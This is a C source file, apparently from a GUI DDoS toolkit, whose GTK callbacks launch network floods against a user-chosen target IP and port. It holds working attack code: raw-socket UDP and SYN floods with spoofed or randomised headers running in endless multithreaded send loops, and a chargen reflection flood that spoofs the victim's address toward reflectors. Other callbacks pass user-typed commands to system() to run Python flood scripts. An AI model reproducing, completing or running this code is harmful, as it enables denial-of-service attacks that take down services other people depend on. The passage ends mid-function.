#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include <sys/types.h>  // send()
#include <sys/socket.h>  // send()
#include <netinet/in.h>  // SOCKADDR_IN
#include <arpa/inet.h>  // inet_addr()
#include <netdb.h>  //gethostbyaddr()
#include <sys/ioctl.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <ifaddrs.h>

#include <gtk-2.0/gtk/gtk.h>
#include <pthread.h> // pthread_create()

#include "../includes/constants.h"
#include "../includes/callbacks_ddos.h"
#include "../includes/utils.h"


/** ESSYN FLOOD **/
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;

/** CHARGEN DDOS **/
//static uint32_t Q_chargen[4096], c_chargen = 362436;

/** VALVE SOURCE ENGINE DDOS **/
//static unsigned int floodport_vse;
volatile int limiter_vse;
//volatile unsigned int pps;
volatile unsigned int sleeptime = 100;


GtkWidget *main_win;
GtkWidget *ddos_text_view;
const gchar *script_command = NULL;

const gchar *Your_IP = NULL;


void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
{
    GtkWidget *run_script_dialog = NULL;
    GtkWidget *script_command_entry = NULL;
    //const gchar *script_command = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "usage: python ddos.py -u <ip> <port> <time>", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    //g_free(text);

    run_script_dialog = gtk_dialog_new_with_buttons("Run UDP Basic Attack 1", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(run_script_dialog, 360, 100);

    script_command_entry = gtk_entry_new();

    gtk_entry_set_text(GTK_ENTRY(script_command_entry), "sudo python ddos.py -u 127.0.0.1 22 30");

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(run_script_dialog)->vbox), script_command_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(run_script_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(run_script_dialog)))
    {
        case GTK_RESPONSE_APPLY:

            script_command = gtk_entry_get_text(GTK_ENTRY(script_command_entry));
            if(system(script_command) == -1)
            {
                error("system script commad", "cb_udp_ddos_script_1");
                return;
            }
            gtk_widget_destroy(run_script_dialog);
            break;

        default:
            gtk_widget_destroy(run_script_dialog);
            return;
    }

    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
    g_print("%s", text);
    g_free(text);

    /* Unused parameter */
    (void)button;
    (void)user_data;

    return;
}


void cb_udp_ddos_script_2(GtkButton *button, gpointer user_data)
{
    GtkWidget *run_script_dialog = NULL;
    GtkWidget *script_command_entry = NULL;
    //const gchar *script_command = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Usage: sudo ./udp_basic.py -u <ip> <port> <time>", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    //g_free(text);

    run_script_dialog = gtk_dialog_new_with_buttons("Run UDP Basic Attack 2", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(run_script_dialog, 360, 100);

    script_command_entry = gtk_entry_new();

    gtk_entry_set_text(GTK_ENTRY(script_command_entry), "sudo ./udp_basic.py -u 127.0.0.1 22 10");

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(run_script_dialog)->vbox), script_command_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(run_script_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(run_script_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            script_command = gtk_entry_get_text(GTK_ENTRY(script_command_entry));
            if(system(script_command) == -1)
            {
                error("system script commad", "cb_udp_ddos_script_2");
                return;
            }
            gtk_widget_destroy(run_script_dialog);
            break;

        default:
            gtk_widget_destroy(run_script_dialog);
            return;
    }

    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
    g_print("%s", text);
    g_free(text);

    /* Unused Parameters */
    (void)button;
    (void)user_data;

    return;
}

/** UDP POWER **/

void cb_udp_power_ddos(void)
{
    GtkWidget *IP_dialog = NULL;
    GtkWidget *port_dialog = NULL;
    GtkWidget *throttle_dialog = NULL;
    GtkWidget *packet_dialog = NULL;
    GtkWidget *threads_dialog = NULL;
    GtkWidget *time_dialog = NULL;

    GtkWidget *get_arg_entry_1 = NULL;
    GtkWidget *get_arg_entry_2 = NULL;
    GtkWidget *get_arg_entry_3 = NULL;
    GtkWidget *get_arg_entry_4 = NULL;
    GtkWidget *get_arg_entry_5 = NULL;
    GtkWidget *get_arg_entry_6 = NULL;

    const gchar *IP = NULL;
    const gchar *port_number = NULL;
    const gchar *throttle = NULL;
    const gchar *packet = NULL;
    const gchar *number_threads = NULL;
    const gchar *time_duration = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;


    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP/hostname> <target port> <throttle (lower is faster)> <packet size> <num threads> <time>", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    //g_free(text);

    IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    throttle_dialog = gtk_dialog_new_with_buttons("Enter Throttle", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    packet_dialog = gtk_dialog_new_with_buttons("Enter Packet Size(max 1024)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    threads_dialog = gtk_dialog_new_with_buttons("Enter Threads Number", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);
    gtk_widget_set_size_request(port_dialog, 360, 100);
    gtk_widget_set_size_request(throttle_dialog, 360, 100);
    gtk_widget_set_size_request(packet_dialog, 360, 100);
    gtk_widget_set_size_request(threads_dialog, 360, 100);
    gtk_widget_set_size_request(time_dialog, 360, 100);

    get_arg_entry_1 = gtk_entry_new();
    get_arg_entry_2 = gtk_entry_new();
    get_arg_entry_3 = gtk_entry_new();
    get_arg_entry_4 = gtk_entry_new();
    get_arg_entry_5 = gtk_entry_new();
    get_arg_entry_6 = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(port_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(throttle_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(packet_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(threads_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_6, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_1));
            gtk_widget_hide(IP_dialog);
            break;

        default:
            gtk_widget_hide(IP_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(port_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(port_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            port_number = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
            gtk_widget_hide(port_dialog);
            break;

        default:
            gtk_widget_hide(port_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(throttle_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(throttle_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            throttle = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
            gtk_widget_hide(throttle_dialog);
            break;

        default:
            gtk_widget_hide(throttle_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(packet_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(packet_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            packet = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
            gtk_widget_hide(packet_dialog);
            break;

        default:
            gtk_widget_hide(packet_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(threads_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(threads_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            number_threads = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
            gtk_widget_hide(threads_dialog);
            break;

        default:
            gtk_widget_hide(threads_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(time_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_6));
            //gtk_widget_hide(time_dialog);
            break;

        default:
            gtk_widget_destroy(IP_dialog);
            gtk_widget_destroy(port_dialog);
            gtk_widget_destroy(throttle_dialog);
            gtk_widget_destroy(packet_dialog);
            gtk_widget_destroy(threads_dialog);
            gtk_widget_destroy(time_dialog);
            return;
    }

    int num_threads = atoi(number_threads);
    int packet_size = atoi(packet);
    unsigned int floodport_power = atoi(port_number);

    pthread_t thread[num_threads];
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport_power);
    sin.sin_addr.s_addr = inet_addr(IP);

    struct thread_data_power td[num_threads];

    int i;
    for(i = 0; i < num_threads; i++)
    {
        td[i].thread_id = i;
        td[i].pks = packet_size;
        td[i].sin = sin;
        td[i].floodport = floodport_power;
        td[i].throttle = atoi(throttle);

        pthread_create(&thread[i], NULL, &flood_power, (void *) &td[i]);
    }

    wait_time_end(atoi(time_duration));

    gtk_widget_destroy(IP_dialog);
    gtk_widget_destroy(port_dialog);
    gtk_widget_destroy(throttle_dialog);
    gtk_widget_destroy(packet_dialog);
    gtk_widget_destroy(threads_dialog);
    gtk_widget_destroy(time_dialog);

    for(i = 0; i < num_threads; i++)
        pthread_cancel(thread[i]);

    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
    g_print("%s", text);
    g_free(text);

    return;
}

uint32_t rand_cmwc_power(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;

    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;

    if (x < c)
    {
        x++;
        c++;
    }

    return (Q[i] = r - x);
}

char *myStrCat(char *s, const char *a)
{
    while (*s != '\0') s++;
    while (*a != '\0') *s++ = *a++;

    *s = '\0';

    return s;
}

char *replStr(const char *str, size_t count)
{
    if (count == 0) return NULL;

    char *ret = malloc (strlen (str) * count + count);

    if (ret == NULL) return NULL;

    *ret = '\0';

    char *tmp = myStrCat (ret, str);

    while (--count > 0)
    {
        tmp = myStrCat (tmp, str);
    }

    return ret;
}

unsigned short csum_power(unsigned short *buf, int nwords)
{
    unsigned long sum;

    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    return (unsigned short)(~sum);
}

void setup_ip_header_power(struct iphdr *iph)
{
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];

    if(getifaddrs(&ifaddr) == -1)
    {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
    {
        if (ifa->ifa_addr == NULL)
            continue;

        family = ifa->ifa_addr->sa_family;

        if(family == AF_INET)
        {
            s = getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
            if (s != 0)
            {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                exit(EXIT_FAILURE);
            }
            if(strcmp(host, "127.0.0.1") != 0)
            {
                break;
            }
        }
    }

    freeifaddrs(ifaddr);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;

    // Initial IP, changed later in infinite loop
    iph->saddr = inet_addr(host);

    return;
}

void setup_udp_header_power(struct udphdr *udph)
{
    udph->source = htons(5678);
    udph->check = 0;

    return;
}

void *flood_power(void *par1)
{
    struct thread_data_power *td = (struct thread_data_power *)par1;

    fprintf(stdout, "Thread %d started\n", td->thread_id);

    char datagram[MAX_PACKET_SIZE];

    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;

    //char new_ip[sizeof "255.255.255.255"];

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0)
    {
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }

    //unsigned int floodport = td->floodport;
    floodport = td->floodport;

    memset(datagram, 0, MAX_PACKET_SIZE);

    setup_ip_header_power(iph);
    setup_udp_header_power(udph);

    //char *data = (char *)udph + sizeof(struct udphdr);    /** ATTENTION uncoment si necessaire     **/
    //data = replStr("\xFF", td->pks);
    udph->len = htons(td->pks);

    iph->tot_len += td->pks;

    udph->dest = htons(floodport);

    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum_power((unsigned short *)datagram, iph->tot_len >> 1);

    int tmp = 1;
    const int *val = &tmp;

    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    int throttle = td->throttle;

    uint32_t random_num;
    //uint32_t ul_dst;
    init_rand(time(NULL));
    if(throttle == 0)
    {
        while(1)
        {
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
            random_num = rand_cmwc_power();
            udph->source = htons(random_num & 0xFFFF);
            iph->check = csum_power((unsigned short *)datagram, iph->tot_len >> 1);
        }
    }

    else
    {
        while(1)
        {
            throttle = td->throttle;
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
            random_num = rand_cmwc_power();
            udph->source = htons(random_num & 0xFFFF);
            iph->check = csum_power((unsigned short *) datagram, iph->tot_len >> 1);

            while(--throttle);

        }
    }
}

/** general functions **/
void init_rand(unsigned long int x)
{
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

/** essyn_attack **/
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;

    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }

    return (Q[i] = r - x);
}

unsigned short csum(unsigned short *buf, int count)
{
    register unsigned long sum = 0;

    while( count > 1 )
    {
        sum += *buf++; count -= 2;
    }

    if(count > 0)
      sum += *(unsigned char *)buf;

    while (sum>>16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (unsigned short)(~sum);
}


unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{
    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;

    //unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));

    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);

    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));

    unsigned short output = csum(tcp,totaltcp_len);

    free(tcp);
    return output;
}


void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = inet_addr(Your_IP);
}

void setup_tcp_header(struct tcphdr *tcph)
{
    tcph->source = htons(5678);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}


void *flood(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0)
    {
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }

    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_tcp_header(tcph);

    tcph->dest = htons(floodport);

    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);

    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    init_rand(time(NULL));

    while(1)
    {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    }
}

void cb_essyn_attack(void)
{
    GtkWidget *IP_dialog = NULL;
    GtkWidget *Your_IP_dialog = NULL;
    GtkWidget *port_dialog = NULL;
    GtkWidget *threads_dialog = NULL;
    //GtkWidget *pps_dialog = NULL;
    GtkWidget *time_dialog = NULL;

    GtkWidget *get_arg_entry_1 = NULL;
    GtkWidget *get_arg_entry_2 = NULL;
    GtkWidget *get_arg_entry_3 = NULL;
    GtkWidget *get_arg_entry_4 = NULL;
    GtkWidget *get_arg_entry_5 = NULL;

    const gchar *IP = NULL;
    const gchar *port_number = NULL;
    const gchar *number_of_threads = NULL;
    //const gchar *pps_number = NULL;
    const gchar *time_duration = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;


    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP> <Your IP> <port> <threads number> <time>", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    //g_free(text);

    IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    Your_IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    threads_dialog = gtk_dialog_new_with_buttons("Enter Number of Threads", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    //pps_dialog = gtk_dialog_new_with_buttons("Enter pps Limiter (-1 for no limit)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);
    gtk_widget_set_size_request(Your_IP_dialog, 360, 100);
    gtk_widget_set_size_request(port_dialog, 360, 100);
    gtk_widget_set_size_request(threads_dialog, 360, 100);
    gtk_widget_set_size_request(time_dialog, 360, 100);

    get_arg_entry_1 = gtk_entry_new();
    get_arg_entry_2 = gtk_entry_new();
    get_arg_entry_3 = gtk_entry_new();
    get_arg_entry_4 = gtk_entry_new();
    get_arg_entry_5 = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(port_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(threads_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(Your_IP_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_1));
            gtk_widget_hide(IP_dialog);
            break;

        default:
            gtk_widget_hide(IP_dialog);;
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(Your_IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(Your_IP_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            Your_IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
            gtk_widget_hide(Your_IP_dialog);
            break;

        default:
            gtk_widget_hide(Your_IP_dialog);;
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(port_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(port_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            port_number = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
            gtk_widget_hide(port_dialog);
            break;

        default:
            gtk_widget_hide(port_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(threads_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(threads_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            number_of_threads = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
            gtk_widget_hide(threads_dialog);
            break;

        default:
            gtk_widget_hide(threads_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(time_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
            gtk_widget_hide(time_dialog);
            break;

        default:
            gtk_widget_destroy(IP_dialog);
            gtk_widget_destroy(port_dialog);
            gtk_widget_destroy(threads_dialog);
            gtk_widget_destroy(time_dialog);
            return;
    }

    int num_threads = atoi(number_of_threads);
    floodport = atoi(port_number);

    pthread_t thread[num_threads];

    int i;
    for(i = 0; i < num_threads; i++)
    {
        pthread_create(&thread[i], NULL, &flood, (void*)IP);
    }

    wait_time_end(atoi(time_duration));

    gtk_widget_destroy(IP_dialog);
    gtk_widget_destroy(Your_IP_dialog);
    gtk_widget_destroy(port_dialog);
    gtk_widget_destroy(threads_dialog);
    gtk_widget_destroy(time_dialog);

    for(i = 0; i < num_threads; i++)
        pthread_cancel(thread[i]);

    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
    g_print("%s", text);
    g_free(text);

    return;
}

/** CHARGEN DDOS **/

/* header checksums */
unsigned short csum_chargen(unsigned short *buf, int nwords)
{
    unsigned long sum;

    for(sum = 0; nwords > 0; nwords--)
        sum += *buf++;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    return (unsigned short)(~sum);
}

void setup_ip_header_chargen(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}

void setup_udp_header_chargen(struct udphdr *udph)
{
    udph->source = htons(5678);
    udph->dest = htons(19);
    udph->check = 0;
    strcpy((void *)udph + sizeof(struct udphdr), "h");
    udph->len = htons(sizeof(struct udphdr) + 3);
}


void *flood_chargen(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;

    char datagram[MAX_PACKET_SIZE];

    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    struct  list *list_node = td->list_node;

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

    if(s < 0)
    {
          fprintf(stderr, "Could not open raw socket.\n");
          exit(-1);
    }

    init_rand(time(NULL));

    memset(datagram, 0, MAX_PACKET_SIZE);

    setup_ip_header_chargen(iph);
    setup_udp_header_chargen(udph);

    udph->source = sin.sin_port;
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum_chargen((unsigned short *) datagram, iph->tot_len >> 1);
    int tmp = 1;

    const int *val = &tmp;

    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    while(1)
    {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
        list_node = list_node->next;
        iph->daddr = list_node->data.sin_addr.s_addr;
        iph->check = csum_chargen((unsigned short *) datagram, iph->tot_len >> 1);
    }
}

void cb_chargen_ddos(void)
{
    GtkWidget *IP_dialog = NULL;
    GtkWidget *port_dialog = NULL;
    GtkWidget *reflection_dialog = NULL;
    GtkWidget *throttle_dialog = NULL;
    GtkWidget *time_dialog = NULL;

    GtkWidget *get_arg_entry_1 = NULL;
    GtkWidget *get_arg_entry_2 = NULL;
    GtkWidget *get_arg_entry_3 = NULL;
    GtkWidget *get_arg_entry_4 = NULL;
    GtkWidget *get_arg_entry_5 = NULL;

    const gchar *IP = NULL;
    const gchar *port_number = NULL;
    const gchar *reflection = NULL;
    const gchar *throttle = NULL;
    const gchar *time_duration = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;


    /* Obtaining the buffer associated with the widget. */
